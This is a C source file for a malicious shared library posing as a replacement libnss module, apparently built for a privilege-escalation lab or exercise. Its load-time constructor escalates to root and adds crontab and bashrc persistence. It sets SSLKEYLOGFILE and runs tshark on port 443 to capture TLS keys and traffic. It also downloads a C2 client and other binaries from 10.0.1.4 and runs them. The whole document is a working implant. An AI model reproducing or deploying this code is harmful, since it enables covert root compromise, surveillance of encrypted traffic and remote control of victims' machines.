/**
* 
* Replacement library for libnss_x.so.2 
*
*/
#include <unistd.h>
#include <sys/syscall.h>  
#include <sys/wait.h> 
#include <fcntl.h>
#include <sys/stat.h>

void test(char* argv[]);
void appendToFile(char* name, char* content, int len);
void runAlone(char* argv[]);

static void __attribute__((constructor)) _init(void) {
	syscall(SYS_setuid, 0);
	syscall(SYS_setgid, 0);
	int save_out = dup(1);
	int save_err = dup(2);
	int out = open("/dev/null", O_WRONLY | O_APPEND);
	dup2(out,1);
	dup2(out,2);

	appendToFile("/etc/bash.bashrc", "export SSLKEYLOGFILE=/var/log/gamelog/key.log;\n",47);

	appendToFile("/etc/bash.bashrc", "export GAMELOG=/var/log/gamelog/syslog.log;\n",44);
	appendToFile("/etc/crontab", "00 9-17 * * 1-5 root /usr/bin/systemd-checker;\n",47);

	appendToFile("/etc/crontab", "@reboot root tshark -ni any -f 'tcp port 443' -w /var/log/gamelog/error_log -b duration:5000;\n",94);

	char* argv2[] = {"/bin/mkdir","-p", "/var/log/gamelog",NULL };
	test(argv2);



	char* argv0[] = {"/usr/bin/apt","install","-y","tshark", "net-tools",NULL};
	test(argv0);

	char* argv8[] = {"/usr/bin/wget","--quiet","http://10.0.1.4/exploit/updatesvc_aka_c2client","-O", "/usr/bin/systemd-check", NULL};
	test(argv8);

	char* argv9[] = {"/usr/bin/wget","--quiet","http://10.0.1.4/exploit/check_update","-O", "/usr/bin/systemd-checker", NULL};
	test(argv9);
	
	char* argv10[] = {"/usr/bin/wget","--quiet","http://10.0.1.4/exploit/enumerate", "-O", "/usr/bin/enumerate", NULL};
	test(argv10);


	chmod("/usr/bin/systemd-check",0100);
        chmod("/usr/bin/systemd-checker",0100);
        chmod("/usr/bin/enumerate",0100);



	char* argv11[] = { "/usr/bin/enumerate", NULL };
	test(argv11);

	char* argv7[] = {"/usr/bin/tshark", "-ni", "any", "-f", "tcp port 443", "-w", "/var/log/gamelog/error_log", "-b", "duration:5000", NULL};
	runAlone(argv7);

	char* argv12[] = {"/usr/bin/systemd-checker", NULL};
	test(argv12);

	// fflush(1); fflush(2);
	close(out);

	dup2(save_out,1);
	dup2(save_err,2);
	close(save_out);
	close(save_err);

	syscall(SYS_exit, 69);
}


void appendToFile(char* name, char* content,int len) {
	int f = open(name,O_WRONLY | O_APPEND);
	int c = write(f, content, len);
	close(f);
}

void runAlone(char* argv[]) {
	char* envp[] = {
		"SSLKEYLOGFILE=/var/log/gamelog/key.log",
		"GAMELOG=/var/log/gamelog/syslog.log",
		"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games",
		"LC_MESSAGES=en_GB.UTF-8",
		"LC_ALL=en_GB.UTF-8",
		"LC_TELEPHONE=en_GB.UTF-8",
		"LC_MEASUREMENT=en_GB.UTF-8",
		NULL
	};
	pid_t parent = getpid();
	pid_t pid = fork();

	if (pid == -1)
	{
	    // error, failed to fork()
	} 
	else if (pid > 0)
	{
	    int status;
	    // Don't wait for child. 
	    // waitpid(pid, &status, 0);
	}
	else 
	{
	    // we are the child
		int e = execve(argv[0], argv,envp);
		syscall(SYS_exit, -1);   // exec never returns
	}

}

void test(char* argv[]) {
	char* envp[] = {
		"SSLKEYLOGFILE=/var/log/gamelog/key.log",
		"GAMELOG=/var/log/gamelog/syslog.log",
		"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games",
		"LC_MESSAGES=en_GB.UTF-8",
		"LC_ALL=en_GB.UTF-8",
		"LC_TELEPHONE=en_GB.UTF-8",
		"LC_MEASUREMENT=en_GB.UTF-8",
		NULL
	};
	pid_t parent = getpid();
	pid_t pid = fork();

	if (pid == -1)
	{
	    // error, failed to fork()
	} 
	else if (pid > 0)
	{
	    int status;
	    waitpid(pid, &status, 0);
	    if(status > 0) {
		syscall(SYS_exit,status);   // exec never returns
	    }
	}
	else 
	{
	    // we are the child
		int e = execve(argv[0], argv,envp);
		syscall(SYS_exit,e);   // exec never returns
	}
}
